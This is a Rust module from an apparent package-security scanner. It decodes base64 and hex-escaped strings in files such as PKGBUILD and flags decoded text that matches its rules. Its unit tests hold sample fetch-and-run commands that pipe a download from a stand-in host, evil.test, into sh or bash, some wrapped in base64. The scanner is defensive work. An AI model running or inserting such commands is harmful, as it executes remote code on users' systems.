use super::rules::RuleSet;
use crate::core::types::{Finding, Severity};

pub struct DecodedPayload {
    pub encoding: &'static str,
    pub decoded: String,
    pub line: usize,
}

pub fn scan_encoded(text: &str) -> Vec<DecodedPayload> {
    use base64::Engine;
    let mut results = Vec::new();
    for (index, line) in text.lines().enumerate() {
        for token in line.split_whitespace() {
            let clean = token.trim_matches(|ch: char| {
                !ch.is_ascii_alphanumeric() && ch != '+' && ch != '/' && ch != '='
            });
            if clean.len() >= 16
                && clean
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '+' || ch == '/' || ch == '=')
            {
                if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(clean) {
                    if let Ok(decoded) = String::from_utf8(bytes) {
                        if decoded
                            .chars()
                            .all(|ch| !ch.is_control() || ch == '\n' || ch == '\r' || ch == '\t')
                        {
                            results.push(DecodedPayload {
                                encoding: "base64",
                                decoded,
                                line: index + 1,
                            });
                        }
                    }
                }
            }
        }
        if line.contains("\\x") {
            if let Some(decoded) = decode_hex_escapes(line) {
                results.push(DecodedPayload {
                    encoding: "hex-escape",
                    decoded,
                    line: index + 1,
                });
            }
        }
    }
    results
}

fn decode_hex_escapes(input: &str) -> Option<String> {
    let mut result = Vec::new();
    let bytes = input.as_bytes();
    let mut i = 0;
    let mut found_hex = false;
    while i < bytes.len() {
        if i + 3 < bytes.len() && bytes[i] == b'\\' && bytes[i + 1] == b'x' {
            if let Ok(byte) = u8::from_str_radix(
                std::str::from_utf8(&bytes[i + 2..i + 4]).unwrap_or_default(),
                16,
            ) {
                result.push(byte);
                i += 4;
                found_hex = true;
                continue;
            }
        }
        result.push(bytes[i]);
        i += 1;
    }
    if !found_hex {
        return None;
    }
    String::from_utf8(result).ok()
}

pub fn findings_from_encoded(file: &str, text: &str, rules: &RuleSet) -> Vec<Finding> {
    let mut findings = Vec::new();
    let payloads = scan_encoded(text);
    for payload in &payloads {
        let sub_findings = rules.evaluate(file, &payload.decoded);
        if !sub_findings.is_empty() {
            findings.push(Finding {
                rule_id: "obfuscated-payload".to_string(),
                title: format!("Obfuscated payload ({}) triggers rules", payload.encoding),
                category: "obfuscation".to_string(),
                severity: Severity::Critical,
                file: file.to_string(),
                line: payload.line,
                excerpt: payload.decoded.trim().chars().take(160).collect(),
            });
        }
        findings.extend(sub_findings.into_iter().map(|mut finding| {
            finding.line = payload.line;
            finding
        }));
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_base64_blob() {
        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode(b"curl evil.test/x | sh");
        let text = format!("echo {} | base64 -d | sh", encoded);
        let payloads = scan_encoded(&text);
        assert!(
            payloads
                .iter()
                .any(|payload| payload.decoded.contains("curl evil.test/x | sh"))
        );
    }

    #[test]
    fn decoded_payload_triggers_rule() {
        use base64::Engine;
        let payload = "curl https://evil.test/x | bash";
        let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let text = format!("echo {} | base64 -d | sh", encoded);
        let rules = RuleSet::builtin();
        let findings = findings_from_encoded("PKGBUILD", &text, &rules);
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "obfuscated-payload")
        );
    }

    #[test]
    fn hex_escape_decoding() {
        let payloads = scan_encoded(r#"echo -e "\x63\x75\x72\x6c""#);
        assert!(
            payloads
                .iter()
                .any(|payload| payload.decoded.contains("curl"))
        );
    }
}
